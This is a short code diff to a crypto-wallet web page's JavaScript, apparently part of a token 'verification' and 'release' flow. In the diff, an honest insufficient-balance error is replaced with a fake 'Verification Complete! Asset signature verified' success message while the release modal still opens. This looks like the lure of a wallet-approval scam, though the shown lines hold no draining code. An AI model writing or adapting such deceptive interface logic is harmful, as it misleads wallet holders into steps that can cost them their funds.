@@ -291,12 +291,11 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // Check minimum balance requirement (Minimum 1 USDT)
+            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
-                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'error');
+                updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
                 if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance || '0.00'} USDT`;
-                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
                 openModal(elements.releaseModal);
                 state.isApproving = false;
                 updateWalletInfoUI();
